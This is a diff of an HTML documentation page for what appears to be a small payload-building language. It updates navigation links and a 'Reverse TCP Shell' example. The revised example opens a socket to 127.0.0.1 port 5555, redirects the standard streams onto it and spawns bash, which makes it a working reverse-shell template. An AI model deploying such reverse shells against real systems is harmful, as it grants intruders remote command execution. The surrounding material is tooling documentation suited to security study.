@@ -15,7 +15,7 @@
     <link rel="index" title="Index" href="genindex.html" />
     <link rel="search" title="Search" href="search.html" />
     <link rel="next" title="Compilation Process" href="compilation.html" />
-    <link rel="prev" title="Language Features" href="language_spec.html" />
+    <link rel="prev" title="Standard Library" href="stdlib.html" />
 
   <link rel="stylesheet" href="_static/custom.css" type="text/css" />
 
@@ -46,7 +46,7 @@ message: &quot;Hello, world!&quot;
 
 [[code]]
 [main]
-&gt; sys_write &quot;message&quot; 14
+&gt; sys_write &quot;message&quot; 14 ${STDOUT}
 &gt; sys_exit
 </pre></div>
 </div>
@@ -98,22 +98,20 @@ Hello, world!
 <p><strong>Program File</strong></p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>!link stdlib/network.mkpk
 !link stdlib/syscall.mkpk
-!link stdlib/execve.mkpk
+!link stdlib/shell.mkpk
 
 [[data]]
-exit_msg: &quot;Connection Terminated&quot;
-# 5555 in little endian.
-port: 0xb315
-# 127.0.0.1 in little endian.
-addr: 0x0100007f
+PORT: 0xb315
+LOCALHOST_ADDR: 0x0100007f
 
 [[code]]
 [main]
-&gt; socket
-&gt; connect &quot;addr&quot; &quot;port&quot;
-&gt; dup2
-&gt; bin_sh
-&gt; sys_write &quot;exit_msg&quot; 22
+&gt; sys_socket ${AF_INET} ${SOCK_STREAM} 0x0
+mov r9, rax
+&gt; sockaddr_init &quot;LOCALHOST_ADDR&quot; &quot;PORT&quot; ${AF_INET}
+&gt; sys_connect r9 rsp 0x10
+&gt; dup_stdstreams r9
+&gt; bin_bash
 &gt; sys_exit
 </pre></div>
 </div>
@@ -197,9 +195,11 @@ addr: 0x0100007f
 
 <h3>Navigation</h3>
 <ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="overview.html"><strong>Overview</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="installation.html"><strong>Installation</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="usage.html"><strong>Usage</strong></a></li>
 <li class="toctree-l1"><a class="reference internal" href="language_spec.html"><strong>Language Features</strong></a></li>
+<li class="toctree-l1"><a class="reference internal" href="stdlib.html"><strong>Standard Library</strong></a></li>
 <li class="toctree-l1 current"><a class="current reference internal" href="#"><strong>Examples</strong></a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#logging-to-stdout">Logging to Stdout</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#reverse-tcp-shell">Reverse TCP Shell</a></li>
@@ -216,7 +216,7 @@ addr: 0x0100007f
 <h3>Related Topics</h3>
 <ul>
   <li><a href="index.html">Documentation overview</a><ul>
-      <li>Previous: <a href="language_spec.html" title="previous chapter"><strong>Language Features</strong></a></li>
+      <li>Previous: <a href="stdlib.html" title="previous chapter"><strong>Standard Library</strong></a></li>
       <li>Next: <a href="compilation.html" title="next chapter"><strong>Compilation Process</strong></a></li>
   </ul></li>
 </ul>
